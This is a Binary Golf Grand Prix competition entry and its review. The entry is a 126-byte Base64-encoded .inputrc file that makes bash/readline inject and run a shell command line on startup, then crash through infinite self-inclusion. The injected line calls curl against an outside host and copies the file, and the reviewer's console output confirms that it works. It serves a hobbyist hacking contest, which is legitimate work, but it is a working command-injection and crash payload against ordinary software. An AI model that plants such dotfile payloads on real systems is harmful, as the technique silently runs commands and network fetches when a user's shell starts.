## Entry Info

- Date: 2025-11-29
- BGGP Challenge: 3 + 4 + 5 + 6
- Name: bah
- Contact Info: bahorn on the BGGP discord
- Online Presence: https://b.horn.uk/
- Writeup Link: https://github.com/bahorn/inputrc-bd/tree/main/bggp


## File Info

- Target File Type: `.inputrc`
- Target File Size: 126
- SHA256 Hash: d679bc511e153a2b8aba86655ed3d9c0b63dd7ba3929c16ccd78bdf74e432a5f

### File Contents

_Please encode the file as Base64_

```
Qy1tOiJcbmVjaG8gNjtjdXJsIC1MIGJpbmFyeS5nb2xmLzYvNjtjcCAuaW5wdXRyYyA2O2JpbmQgJ3NldCBrZXltYXAgdmknO2JpbmQgLWYuaW5wdXRyY1xuIgokaWYga2V5bWFwID09IHZpCiRpbmNsdWRlIC5pbnB1dHJj
```

## Environment Info

### Target Software and Version

bash/GNU readline.

Tested on Ubuntu 24.04 with bash 5.2.21, readline 8.2-4build1 (according to apt).

(Should be flexible on versions)

### Environment Setup

_Description of Target Software's Environment (Platform/OS, Setup Instructions, etc.)_

Install Ubuntu 24.04 in a VM and you should be good, everything is built-in.

Write the file to `.inputrc` in your home directory (or another and run bash with `HOME=/path/to/dir bash`). After invoking bash run any command you want or just press enter, then the entry will run.

## Additional Info

_Here attach any additional information about the file, including supporting notes, screenshots, videos, console output, etc._

* crashing bash / readline by doing an infinite recursion by making the file include itself.
* boring generic approaches for BGGP4/5/6, just injecting commands to be ran by bash.
* using conditionals in the file, allowing the behaviour to change on reload, to only trigger the crash after the rest of the entry has ran.

Expect output like:
```
$ cp bah_bggp_inputrc .inputrc
$ HOME=`pwd` bash
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
a@md:~$
a@md:~$ echo 6;curl -L binary.golf/6/6;cp .inputrc 6;bind 'set keymap vi';bind -f.inputrc
6
Another #BGGP6 download!!!!!! Hi @binarygolf https://binary.golf/6
[1]    462255 segmentation fault (core dumped)  HOME=`pwd` bash
```
(note the file injects the command into bash, you do not type it in yourself)

NOTE: If this is an update to an existing entry, please include a link to your entry below this text. Reminder that authors can only update an entry once during BGGP.


## Verification 

Issue: https://github.com/binarygolf/BGGP/issues/166

- Reviewer: netspooky
- Review Date: 2026-03-14
- SHA256: d679bc511e153a2b8aba86655ed3d9c0b63dd7ba3929c16ccd78bdf74e432a5f
- Score: 4994 [ Base: 3970 (4096 - 126) +256 (BGGP3) +256 (BGGP4) +256 (BGGP5) +256 (Writeup) ]
- Note: works as is

Output:
```
$ cd

$ base64 -d <<< Qy1tOiJcbmVjaG8gNjtjdXJsIC1MIGJpbmFyeS5nb2xmLzYvNjtjcCAuaW5wdXRyYyA2O2JpbmQgJ3NldCBrZXltYXAgdmknO2JpbmQgLWYuaW5wdXRyY1xuIgokaWYga2V5bWFwID09IHZpCiRpbmNsdWRlIC5pbnB1dHJj > inputrc

$ sha256sum inputrc 
d679bc511e153a2b8aba86655ed3d9c0b63dd7ba3929c16ccd78bdf74e432a5f  inputrc

$ cp inputrc .inputrc

$ HOME=`pwd` bash

$ 

$ echo 6;curl -L binary.golf/6/6;cp .inputrc 6;bind 'set keymap vi';bind -f.inputrc
6
Another #BGGP6 download!!!!!! Hi @binarygolf https://binary.golf/6
Segmentation fault (core dumped)
```


